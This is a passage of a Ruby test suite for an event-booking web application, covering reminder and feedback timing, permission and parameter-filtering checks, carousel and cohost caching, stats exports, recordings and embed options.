    now = Time.utc(2026, 3, 13, 10, 0, 0)
    event = Event.new(start_time: now - 5.minutes, reminder_hours_before: 1)

    refute event.reminder_due_within?(1.hour, now)
  end

  test 'feedback request is due when its send time falls within the next hour' do
    covers 'events/feedback-request-after-event@2bacdf'
    now = Time.utc(2026, 3, 13, 10, 55, 0)
    event = Event.new(
      organisation: FactoryBot.build_stubbed(:organisation),
      feedback_questions: 'How was it?',
      end_time: Time.utc(2026, 3, 13, 10, 0, 0),
      feedback_hours_after: 1
    )

    assert event.feedback_due_within?(1.hour, now)
  end

  test 'feedback request with blank hours is due at event end' do
    covers 'events/feedback-request-blank-at-end@f0b3f9'
    now = Time.utc(2026, 3, 13, 9, 55, 0)
    event = Event.new(
      organisation: FactoryBot.build_stubbed(:organisation),
      feedback_questions: 'How was it?',
      end_time: Time.utc(2026, 3, 13, 10, 0, 0)
    )

    assert event.feedback_due_within?(1.hour, now)
  end

  test 'feedback request is not sent once it has already been sent' do
    covers 'events/feedback-request-after-event@2bacdf'
    now = Time.utc(2026, 3, 13, 10, 55, 0)
    event = Event.new(
      organisation: FactoryBot.build_stubbed(:organisation),
      feedback_questions: 'How was it?',
      end_time: Time.utc(2026, 3, 13, 10, 0, 0),
      feedback_hours_after: 1,
      sent_feedback_requests_at: Time.utc(2026, 3, 13, 10, 0, 0)
    )

    refute event.feedback_due_within?(1.hour, now)
  end

  test 'feedback request bulk task does not reschedule very old pending sends' do
    now = Time.utc(2026, 5, 17, 12, 0, 0)
    event = Event.new(
      organisation: FactoryBot.build_stubbed(:organisation),
      feedback_questions: 'How was it?',
      end_time: Time.utc(2026, 3, 13, 10, 0, 0),
      feedback_hours_after: 0
    )

    refute event.feedback_due_within?(1.hour, now)
  end

  test 'feedback request delay cannot exceed 30 days' do
    covers 'events/feedback-request-max-30-days@52678f'
    event = Event.new(feedback_hours_after: Event::MAX_FEEDBACK_HOURS_AFTER + 1)
    event.valid?

    assert_includes event.errors[:feedback_hours_after], "cannot be more than #{Event::MAX_FEEDBACK_HOURS_AFTER}"
  end

  test 'event gathering must be administered by the last saver' do
    create_event
    other_account = FactoryBot.create(:account)
    other_gathering = FactoryBot.create(:gathering, account: other_account)
    @event.gathering = other_gathering
    @event.last_saved_by = @account

    refute @event.valid?
    assert_includes @event.errors[:gathering], "- you don't have permission to add attendees to this gathering"
  end

  test 'event session create rejects event_id from params' do
    create_event(prices: [0])
    other_event = FactoryBot.create(:event)

    sign_in_with_rack(@account)
    post "/e/#{@event.slug}/event_sessions/new", event_session: {
      start_time: (@event.start_time + 1.hour).iso8601,
      end_time: (@event.end_time - 1.hour).iso8601,
      event_id: other_event.id
    }

    assert_equal 1, @event.event_sessions.count
    assert_equal 0, other_event.event_sessions.count
  end

  test 'event edit ignores deleted_at and timestamps from params' do
    create_event(prices: [0])
    created_at = @event.created_at

    sign_in_with_rack(@account)
    post "/e/#{@event.slug}/edit", event: { name: 'Renamed', deleted_at: '2020-01-01', created_at: '2020-01-01' }

    event = Event.unscoped.find(@event.id)
    assert_equal 'Renamed', event.name
    assert_nil event.deleted_at
    assert_equal created_at.to_i, event.created_at.to_i
  end

  test 'rpayment edit rejects event_id from params' do
    create_event(prices: [0])
    other_event = FactoryBot.create(:event)
    rpayment = @event.rpayments.create!(account: @account, amount: 10, currency: @event.currency, role: Rpayment.roles.first)

    sign_in_with_rack(@account)
    post "/e/#{@event.slug}/rpayments/#{rpayment.id}/edit", rpayment: {
      amount: 10,
      currency: @event.currency,
      role: rpayment.role,
      event_id: other_event.id
    }

    assert_equal @event.id, rpayment.reload.event_id
  end

  test 'tagging a carousel stores matching event carousel ids' do
    create_event
    tag = FactoryBot.create(:event_tag)
    carousel = FactoryBot.create(:carousel, organisation: @organisation)
    tag_event(@event, tag)
    assert_empty Array(@event.carousel_ids)

    tag_carousel(carousel, tag)
    @event.reload
    assert_equal [carousel.id], @event.carousel_ids
  end

  test 'tagging an event does not store another organisation carousel with the same tag' do
    create_event
    other_organisation = FactoryBot.create(:organisation)
    tag = FactoryBot.create(:event_tag)
    other_carousel = FactoryBot.create(:carousel, organisation: other_organisation)
    tag_carousel(other_carousel, tag)
    tag_event(@event, tag)

    assert_empty Array(@event.carousel_ids)
  end

  test 'adding and removing a cohost updates the cohost organisation carousel ids' do
    create_event
    cohost = FactoryBot.create(:organisation)
    tag = FactoryBot.create(:event_tag)
    carousel = FactoryBot.create(:carousel, organisation: cohost)
    tag_carousel(carousel, tag)
    tag_event(@event, tag)
    assert_empty Array(@event.carousel_ids)

    @event.cohostships.create!(organisation: cohost)
    @event.reload
    assert_equal [carousel.id], @event.carousel_ids

    @event.cohostships.find_by(organisation: cohost).destroy
    @event.reload
    assert_empty Array(@event.carousel_ids)
  end

  test 'hosts_ids_cache holds the organisation and its cohosts' do
    create_event
    assert_equal [@organisation.id], @event.hosts_ids_cache

    cohost = FactoryBot.create(:organisation)
    @event.cohostships.create!(organisation: cohost)
    assert_equal [@organisation.id, cohost.id], @event.reload.hosts_ids_cache

    @event.cohostships.find_by(organisation: cohost).destroy
    assert_equal [@organisation.id], @event.reload.hosts_ids_cache
  end

  test 'events_including_cohosted returns hosted and cohosted events but not deleted ones' do
    create_event
    create_event(as: :deleted_event)
    @deleted_event.destroy
    cohosted_event = FactoryBot.create(:event)
    cohosted_event.cohostships.create!(organisation: @organisation)
    FactoryBot.create(:event)

    assert_equal [@event.id, cohosted_event.id].sort, @organisation.events_including_cohosted.pluck(:id).sort
  end

  test 'hinted hints the hosts index only where it exists' do
    create_event
    Event.reset_existing_index_names!
    assert_nil @organisation.events_including_cohosted.hinted(Event::HOSTS_INDEX).options[:hint]

    Event.collection.indexes.create_one({ hosts_ids_cache: 1, deleted_at: 1, secret: 1, start_time: 1 }, name: Event::HOSTS_INDEX)
    Event.reset_existing_index_names!
    assert_nil @organisation.events_including_cohosted.options[:hint]
    events = @organisation.events_including_cohosted.hinted(Event::HOSTS_INDEX).publicly_visible.future_current_evergreen
    assert_equal Event::HOSTS_INDEX, events.options[:hint]
    assert_equal [@event.id], events.pluck(:id)
    assert_equal 1, events.count
  ensure
    Event.collection.indexes.drop_one(Event::HOSTS_INDEX) if Event.collection.indexes.any? { |index| index['name'] == Event::HOSTS_INDEX }
    Event.reset_existing_index_names!
  end

  test 'trending ranks events by their paid orders in the last week, then the soonest of the rest' do
    create_event(as: :quiet_soon, start_time: 2.days.from_now, end_time: 3.days.from_now)
    create_event(as: :quiet_later, start_time: 5.days.from_now, end_time: 6.days.from_now)
    create_event(as: :busy, start_time: 10.days.from_now, end_time: 11.days.from_now)
    create_event(as: :busier, start_time: 20.days.from_now, end_time: 21.days.from_now)
    # trending only ranks events that could be on the homepage
    [@quiet_soon, @quiet_later, @busy, @busier].each { |event| event.set(browsable: true, has_image: true, hidden_from_homepage: false) }
    [@busy, @busier, @busier].each do |event|
      Order.create!(event: event, account: FactoryBot.create(:account), value: 10, payment_completed: true, currency: 'GBP')
    end
    Order.create!(event: @quiet_later, account: FactoryBot.create(:account), value: 10, payment_completed: true, currency: 'GBP').set(created_at: 2.weeks.ago)
    Order.create!(event: @quiet_soon, account: FactoryBot.create(:account), value: 10, payment_completed: false, currency: 'GBP')
    events = Event.and(:id.in => [@quiet_soon.id, @quiet_later.id, @busy.id, @busier.id])

    assert_equal [@busier.id, @busy.id, @quiet_soon.id, @quiet_later.id], events.trending.map(&:id)
    assert_equal [@busier.id, @busy.id, @quiet_soon.id], events.trending(limit: 3).map(&:id)

    @quiet_later.set(trending: true)
    assert_equal [@quiet_later.id, @busier.id], events.trending(limit: 2).map(&:id)
  end

  test 'EventIds pages through events in the given order, loading only the page' do
    events = 5.times.map { |i| create_event(as: :"event#{i}") }
    ids = EventIds.new([events[3], events[0], events[4], events[1], events[2]].map(&:id))

    page = ids.paginate(page: 2, per_page: 2)
    assert_equal [events[4], events[1]], page.to_a
    assert_equal 5, page.total_entries
    assert_equal 3, page.total_pages
  end

  test 'event cards read tags and cohosts from the joins with_key_includes preloads, without querying' do
    create_event
    cohost = FactoryBot.create(:organisation)
    @event.cohostships.create!(organisation: cohost)
    tag = FactoryBot.create(:event_tag)
    @event.event_tagships.create!(event_tag: tag)

    preloaded = Event.and(id: @event.id).with_key_includes.first
    commands = []
    subscriber = Object.new
    subscriber.define_singleton_method(:started) { |e| commands << e.command_name }
    subscriber.define_singleton_method(:succeeded) { |_| nil }
    subscriber.define_singleton_method(:failed) { |_| nil }
    Mongoid.default_client.subscribe(Mongo::Monitoring::COMMAND, subscriber)
    assert_equal [tag], preloaded.event_tagships.map(&:event_tag)
    assert_equal [cohost], preloaded.cohostships.map(&:organisation)
    preloaded.image_source(cohost)
    assert_empty commands
  ensure
    Mongoid.default_client.unsubscribe(Mongo::Monitoring::COMMAND, subscriber) if subscriber
  end

  test 'events stats CSV reads every event with the same queries, however many events there are' do
    create_stats_event(:event1)
    sign_in_with_rack(@account)
    body, one_event_commands = mongo_commands_during { get "/o/#{@organisation.slug}/events/stats.csv", from: Date.today.to_s }
    row = CSV.parse(body, headers: true).first
    assert_equal 'Coco Ordinator', row['coordinator']
    assert_includes row['facilitators'], 'Fay Cilitator'
    assert_equal 'wellbeing', row['tags']
    assert_equal '1/1', row['checked_in']
    assert_equal '£10, £10', row['ticket_revenue']
    assert_equal '£15 from 1 order', row['revenue_reported_by_dandelion']
    assert_equal '£15 from 1 charge', row['revenue_reported_by_stripe']
    assert_equal '1 response, (100%), 4.0', row['feedback']
    assert_equal 'https://www.facebook.com/events/1', row['facebook_event']

    create_stats_event(:event2)
    create_stats_event(:event3)
    body, three_event_commands = mongo_commands_during { get "/o/#{@organisation.slug}/events/stats.csv", from: Date.today.to_s }
    assert_equal 3, CSV.parse(body, headers: true).size
    assert_equal one_event_commands, three_event_commands
  end

  test "events stats CSV splits an order's credit with a revenue sharer with the same queries, however many events there are" do
    sharer = FactoryBot.create(:account, name: 'Rev Sharer')
    share_revenue = lambda do |event|
      event.set(revenue_sharer_id: sharer.id, revenue_share_to_revenue_sharer: 50)
      event.tickets.each { |ticket| ticket.set(organisation_revenue_share: 0.5) }
      event.orders.each { |order| order.set(revenue_sharer_id: sharer.id, organisation_revenue_share: 0.5, credit_applied: 3) }
    end
    share_revenue.call(create_stats_event(:event1))
    sign_in_with_rack(@account)
    body, one_event_commands = mongo_commands_during { get "/o/#{@organisation.slug}/events/stats.csv", from: Date.today.to_s }
    # £5 of the £10 tickets, less the sharer's part of the £3 credit: £3 × (£10 / £15) × 0.5 = £1
    assert_includes CSV.parse(body, headers: true).first['ticket_revenue_to_revenue_sharer'], '£4'

    share_revenue.call(create_stats_event(:event2))
    share_revenue.call(create_stats_event(:event3))
    body, three_event_commands = mongo_commands_during { get "/o/#{@organisation.slug}/events/stats.csv", from: Date.today.to_s }
    assert_equal 3, CSV.parse(body, headers: true).size
    assert_equal one_event_commands, three_event_commands
  end

  test 'events stats page loads its table in a request of its own, which renders every row with the same queries however many events there are' do
    create_stats_event(:event1)
    # Every row shows the coordinator's avatar, whose url's Dragonfly job is found once for the table. Stored, and its
    # thumbnail's job recorded, directly, as an earlier upload and page view would have left them, so the test doesn't
    # need ImageMagick
    coordinator = @event1.coordinator
    coordinator.set(image_uid: Dragonfly.app.store(File.binread('app/assets/images/test-event.jpg')))
    DragonflyJob.create!(signature: coordinator.image.thumb('400x400#').signature, uid: Dragonfly.app.store(File.binread('app/assets/images/test-event.jpg')))
    sign_in_with_rack(@account)
    page, one_event_page_commands = mongo_commands_during { get "/o/#{@organisation.slug}/events/stats", from: Date.today.to_s }
    assert_includes page, %(data-pagelet-url="/o/#{@organisation.slug}/events/stats?from=#{Rack::Utils.escape(Date.today.to_s)}&amp;table=1")
    refute_includes page, '1/1 tickets sold'
    body, one_event_commands = mongo_commands_during { get "/o/#{@organisation.slug}/events/stats", from: Date.today.to_s, table: 1 }
    assert_includes body, 'Coco Ordinator'
    assert_includes body, 'Fay Cilitator'
    assert_includes body, 'wellbeing'
    assert_includes body, '1/1 tickets sold'
    assert_includes body, '1 order</a>'
    assert_includes body, '1 response'
    refute_includes body, 'data-pagelet-url'

    create_stats_event(:event2)
    create_stats_event(:event3)
    _, three_event_page_commands = mongo_commands_during { get "/o/#{@organisation.slug}/events/stats", from: Date.today.to_s }
    assert_equal one_event_page_commands, three_event_page_commands
    body, three_event_commands = mongo_commands_during { get "/o/#{@organisation.slug}/events/stats", from: Date.today.to_s, table: 1 }
    assert_equal 3, body.scan('1 response').size
    assert_equal one_event_commands, three_event_commands
  end

  test 'hosts cache sync finds and repairs a stale hosts_ids_cache' do
    create_event
    cohost = FactoryBot.create(:organisation)
    @event.cohostships.create!(organisation: cohost)
    @event.unset(:hosts_ids_cache)

    out_of_sync = Event.check_hosts_cache_sync
    assert_equal([@event.id], out_of_sync.map { |entry| entry[:event].id })
    assert_nil @event.reload.hosts_ids_cache

    Event.check_hosts_cache_sync(fix: true)
    assert_equal [@organisation.id, cohost.id], @event.reload.hosts_ids_cache
    assert_empty Event.check_hosts_cache_sync
  end

  test 'removing a tag or carouselship clears carousel ids' do
    create_event
    tag = FactoryBot.create(:event_tag)
    carousel = FactoryBot.create(:carousel, organisation: @organisation)
    tag_carousel(carousel, tag)
    tag_event(@event, tag)
    assert_equal [carousel.id], @event.carousel_ids

    @event.event_tagships.find_by(event_tag: tag).destroy
    @event.reload
    assert_empty Array(@event.carousel_ids)

    tag_event(@event, tag)
    assert_equal [carousel.id], @event.carousel_ids

    carousel.carouselships.find_by(event_tag: tag).destroy
    carousel.sync_tagged_event_carousel_ids_without_delay(tag.id)
    @event.reload
    assert_empty Array(@event.carousel_ids)
  end

  test 'destroying a carousel clears its id from events' do
    create_event
    tag = FactoryBot.create(:event_tag)
    carousel = FactoryBot.create(:carousel, organisation: @organisation)
    tag_carousel(carousel, tag)
    tag_event(@event, tag)
    carousel.destroy
    @event.reload

    assert_empty Array(@event.carousel_ids)
  end

  test 'organisation events json listing filters by stored carousel ids' do
    create_event(as: :matching)
    create_event(as: :other)
    tag = FactoryBot.create(:event_tag)
    carousel = FactoryBot.create(:carousel, organisation: @organisation)
    tag_carousel(carousel, tag)
    tag_event(@matching, tag)

    header 'Referer', "http://example.org/o/#{@organisation.slug}/events"
    get "/o/#{@organisation.slug}/events.json", carousel_ids: [carousel.id.to_s]
    assert last_response.ok?
    assert_includes listing_event_ids, @matching.id.to_s
    refute_includes listing_event_ids, @other.id.to_s
  end

  test 'organisation events json listing ignores another organisation carousel id' do
    create_event
    tag = FactoryBot.create(:event_tag)
    carousel = FactoryBot.create(:carousel, organisation: @organisation)
    tag_carousel(carousel, tag)
    tag_event(@event, tag)
    other_carousel = FactoryBot.create(:carousel, organisation: FactoryBot.create(:organisation))

    header 'Referer', "http://example.org/o/#{@organisation.slug}/events"
    get "/o/#{@organisation.slug}/events.json", carousel_ids: [other_carousel.id.to_s]
    assert last_response.ok?
    refute_includes listing_event_ids, @event.id.to_s
  end

  test 'saving an event does not read an image that is not new' do
    create_event
    # Stored and measured directly, as an earlier upload would have left it, so the test doesn't need ImageMagick
    uid = Dragonfly.app.store(File.binread('app/assets/images/test-event.jpg'))
    @event.set(image_uid: uid, image_width_unmagic: 1920, image_height_unmagic: 1080)

    event = Event.find(@event.id)
    Dragonfly.app.datastore.stub(:read, ->(*) { raise 'read an unchanged image' }) do
      event.update_attributes!(name: 'Renamed')
    end
    assert_equal 1920, event.reload.image_width_unmagic
  end

  test 'signed-out visitors start the events map by interacting with the page' do
    visit '/events'
    assert page.has_css?('a[rel=nofollow][aria-label="Map view"]')
    visit '/events?display=map'
    assert page.has_css?('#map-start', text: 'Click to view map')
    assert page.has_no_css?('#map-canvas', visible: true)
    # Stands in for Google Maps, which bills each map load
    execute_script 'DandelionMap.initializeMap = function () { window.mapStarted = true }'
    find('#map-start').hover
    assert page.has_css?('#map-canvas', visible: true)
    assert page.has_no_css?('#map-start')
    assert evaluate_script('window.mapStarted')
  end

  test 'a duplicated event starts locked' do
    covers 'events/duplicate-starts-locked@9b7b43'
    create_event(prices: [0], locked: false)
    sign_in(@account)
    visit "/e/#{@event.slug}/edit"
    click_button @event.name
    click_link 'Duplicate event'
    # The popover hangs off the page
    page.document.find('.popover').click_button 'Duplicate event'
    assert page.has_content?("This is a duplicate of #{@event.name}")
    duplicate = Event.find_by(duplicated_from_id: @event.id)
    assert page.has_current_path?("/e/#{duplicate.slug}/edit")
    assert duplicate.locked?
    refute @event.reload.locked?
  end

  test "event stats lists all of an organisation's events, including secret and locked ones" do
    covers 'events/event-stats-all-events@6626d6'
    create_event(as: :event1, name: 'Open stats event', prices: [0])
    create_event(as: :event2, name: 'Secret stats event', prices: [0], secret: true)
    create_event(as: :event3, name: 'Locked stats event', prices: [0], locked: true)
    sign_in_with_rack(@account)

    get "/o/#{@organisation.slug}/events/stats", from: Date.today.to_s, table: 1
    assert_equal 200, last_response.status
    ['Open stats event', 'Secret stats event', 'Locked stats event'].each { |name| assert_includes last_response.body, name }

    get "/o/#{@organisation.slug}/events/stats.csv", from: Date.today.to_s
    assert_equal ['Locked stats event', 'Open stats event', 'Secret stats event'], CSV.parse(last_response.body, headers: true).map { |row| row['name'] }.sort
  end

  test 'a new event defaults to a reminder 24 hours before it' do
    covers 'events/reminder-default-and-blank@b3faac'
    create_organisation
    sign_in_with_rack(@account)
    get '/events/new', organisation_id: @organisation.id
    assert_equal 200, last_response.status
    assert_match(/<input[^>]*name="event\[reminder_hours_before\]"[^>]*value="24"|<input[^>]*value="24"[^>]*name="event\[reminder_hours_before\]"/, last_response.body)
  end

  test 'leaving the reminder hours blank skips the reminder' do
    covers 'events/reminder-default-and-blank@b3faac'
    create_event(prices: [0], start_time: 2.hours.from_now, end_time: 3.hours.from_now, reminder_hours_before: nil)
    order = @event.orders.create!(account: @account, currency: 'GBP', value: 0, payment_completed: true)
    @event.tickets.create!(account: @account, order: order, ticket_type: @event.ticket_types.first, payment_completed: true)

    refute @event.reminder_due_within?(1.hour)
    assert_empty(recorded_emails { @event.send_reminders_without_delay(:all) })
    assert_nil @event.reload.sent_reminders_at
  end

  test 'the reminder email subject and body can be customised by the organisation and the event' do
    covers 'events/reminder-custom-subject-body@179fcd'
    create_organisation(reminder_email_title: 'Organisation reminder for [event_name]', reminder_email_body: '<p>Organisation reminder body</p>')
    create_event(name: 'Reminded event', prices: [0], start_time: 2.hours.from_now, end_time: 3.hours.from_now, reminder_hours_before: 24)
    order = @event.orders.create!(account: @account, currency: 'GBP', value: 0, payment_completed: true)
    @event.tickets.create!(account: @account, order: order, ticket_type: @event.ticket_types.first, payment_completed: true)

    emails = recorded_emails { @event.send_reminders_without_delay(@account.id) }
    assert_equal ['Organisation reminder for Reminded event'], emails.map(&:subject_line).uniq
    emails.each { |email| assert_includes email.html, 'Organisation reminder body' }
    assert_equal [@account.email], emails.flat_map(&:recipients)

    @event.update!(reminder_email_title: 'Event reminder for [event_name]', reminder_email_body: '<p>Event reminder body</p>')
    emails = recorded_emails { @event.send_reminders_without_delay(@account.id) }
    assert_equal ['Event reminder for Reminded event'], emails.map(&:subject_line).uniq
    emails.each do |email|
      assert_includes email.html, 'Event reminder body'
      refute_includes email.html, 'Organisation reminder body'
    end
  end

  # ═══════════════════════════════════════════════════════════════════════════
  # Recordings
  # ═══════════════════════════════════════════════════════════════════════════

  test 'a past event with a recording keeps its date and tells buyers they are getting a recording' do
    covers 'events/recording-keeps-date@836029'
    start_time = 3.days.ago.change(hour: 10)
    create_event(prices: [0], start_time: start_time, end_time: start_time + 2.hours, extra_info_for_recording_email: '<p>Watch it here</p>')
    @event.reload
    assert @event.recording?
    assert_equal start_time.to_i, @event.start_time.to_i

    get "/e/#{@event.slug}"
    assert_equal 200, last_response.status
    assert_includes last_response.body, "Access a recording of this event that started on #{start_time.to_date}"
  end

  test 'the recording tab appears once the event is past' do
    covers 'events/recording-tab-once-past@64905b'
    create_event(prices: [0])
    sign_in_with_rack(@account)
    get "/e/#{@event.slug}/edit"
    assert_equal 200, last_response.status
    refute_includes last_response.body, 'href="#tab-recording"'

    @event.update!(start_time: 2.days.ago, end_time: 2.days.ago + 2.hours)
    get "/e/#{@event.slug}/edit"
    assert_includes last_response.body, 'href="#tab-recording"'
    assert_includes last_response.body, 'event[extra_info_for_recording_email]'
  end

  test 'extra info for a recording is in the confirmation emails of bookings made once the event is past' do
    covers 'events/recording-extra-info-in-confirmation@b014b8'
    create_event(prices: [0], extra_info_for_recording_email: '<p>Recording link: https://vimeo.com/1</p>', extra_info_for_ticket_email: '<p>Zoom link</p>')
    order = @event.orders.new(account: @account)
    html = EmailHelper.html(:tickets, event: @event, order: order, account: @account, tickets_table: '', header_image_url: nil)
    assert_includes html, 'Zoom link'
    refute_includes html, 'Recording link'

    @event.update!(start_time: 2.days.ago, end_time: 2.days.ago + 2.hours)
    html = EmailHelper.html(:tickets, event: @event, order: order, account: @account, tickets_table: '', header_image_url: nil)
    assert_includes html, 'Recording link: https://vimeo.com/1'
    refute_includes html, 'Zoom link'
  end

  # ═══════════════════════════════════════════════════════════════════════════
  # Embeds
  # ═══════════════════════════════════════════════════════════════════════════

  test 'embed listing parameters hide the featured title, search, view options, listings and later carousels' do
    covers 'events/embed-listing-params@d85f53'
    create_event(name: 'Featured embed event', prices: [0])
    @event.set(featured: true, has_image: true)
    carousel1 = @organisation.carousels.create!(name: 'First carousel')
    carousel2 = @organisation.carousels.create!(name: 'Second carousel')

    get "/o/#{@organisation.slug}/events", minimal: 1
    assert_includes last_response.body, 'id="events-search-near"'
    assert_includes last_response.body, 'aria-label="View as"'
    assert_includes last_response.body, "carousels/featured?hide_featured_title=\""
    assert_includes last_response.body, "id=\"carousel-#{carousel1.id}\""
    assert_includes last_response.body, "id=\"carousel-#{carousel2.id}\""
    get "/o/#{@organisation.slug}/carousels/featured"
    assert_includes last_response.body, '<h2 class="text-center">Featured</h2>'
    xhr_get "/o/#{@organisation.slug}/events", minimal: 1
    assert_includes last_response.body, 'Featured embed event'

    get "/o/#{@organisation.slug}/events", minimal: 1, hide_featured_title: 1, no_search: 1, first_carousel_only: 1
    refute_includes last_response.body, 'id="events-search-near"'
    assert_includes last_response.body, 'aria-label="View as"'
    assert_includes last_response.body, 'carousels/featured?hide_featured_title=1'
    assert_includes last_response.body, "id=\"carousel-#{carousel1.id}\""
    refute_includes last_response.body, "id=\"carousel-#{carousel2.id}\""
    get "/o/#{@organisation.slug}/carousels/featured", hide_featured_title: 1
    assert_includes last_response.body, 'slick-item'
    refute_includes last_response.body, '<h2 class="text-center">Featured</h2>'

    get "/o/#{@organisation.slug}/events", minimal: 1, no_search: 1, no_view_options: 1
    refute_includes last_response.body, 'id="events-search-near"'
    refute_includes last_response.body, 'aria-label="View as"'

    xhr_get "/o/#{@organisation.slug}/events", minimal: 1, no_listings: 1
    assert_equal 200, last_response.status
    refute_includes last_response.body, 'Featured embed event'
  end

  test 'embed listings with recordings=1 show past events with a recording, most recent first, and past=1 all past events' do
    covers 'events/embed-recordings-param@50657a', 'events/embed-past-param@02bb96'
    create_event(as: :event1, name: 'Older recorded event', prices: [0], start_time: 10.days.ago, end_time: 10.days.ago + 2.hours, extra_info_for_recording_email: '<p>Recording</p>')
    create_event(as: :event2, name: 'Newer recorded event', prices: [0], start_time: 3.days.ago, end_time: 3.days.ago + 2.hours, extra_info_for_recording_email: '<p>Recording</p>')
    create_event(as: :event3, name: 'Unrecorded past event', prices: [0], start_time: 5.days.ago, end_time: 5.days.ago + 2.hours)
    create_event(as: :event4, name: 'Upcoming event', prices: [0])

    xhr_get "/o/#{@organisation.slug}/events", minimal: 1, recordings: 1
    body = last_response.body
    assert_includes body, 'Newer recorded event'
    assert_includes body, 'Older recorded event'
    assert_operator body.index('Newer recorded event'), :<, body.index('Older recorded event')
    refute_includes body, 'Unrecorded past event'
    refute_includes body, 'Upcoming event'

    carousel = @organisation.carousels.create!(name: 'A carousel')
    get "/o/#{@organisation.slug}/events", minimal: 1, recordings: 1
    assert_includes last_response.body, "id=\"carousel-#{carousel.id}\""
    # With the referer the embedding page sends: Rack::Attack challenges a search without one
    get "/o/#{@organisation.slug}/events", { minimal: 1, recordings: 1, search: 1, display: 'grid' }, { 'HTTP_REFERER' => 'https://example.com/' }
    refute_includes last_response.body, "id=\"carousel-#{carousel.id}\""
    assert_includes last_response.body, 'id="events-grid"'

    xhr_get "/o/#{@organisation.slug}/events", minimal: 1, past: 1
    body = last_response.body
    ['Newer recorded event', 'Unrecorded past event', 'Older recorded event'].each { |name| assert_includes body, name }
    refute_includes body, 'Upcoming event'
  end

  test 'ticket_form_only limits the event page to the ticket form' do
    covers 'events/embed-ticket-form-only@7366b1'
    create_event(prices: [0], description: '<p>A description only the full event page shows</p>')

    # The page body, after the head's meta description
    page_body = -> { last_response.body.split('</head>', 2).last }

    get "/e/#{@event.slug}"
    assert_includes page_body.call, 'A description only the full event page shows'
    assert_includes page_body.call, 'id="select-tickets"'
    assert_includes page_body.call, 'id="header"'

    get "/e/#{@event.slug}", ticket_form_only: 1
    assert_equal 200, last_response.status
    assert_includes page_body.call, 'id="select-tickets"'
    refute_includes page_body.call, 'A description only the full event page shows'
    refute_includes page_body.call, 'id="header"'
  end
end
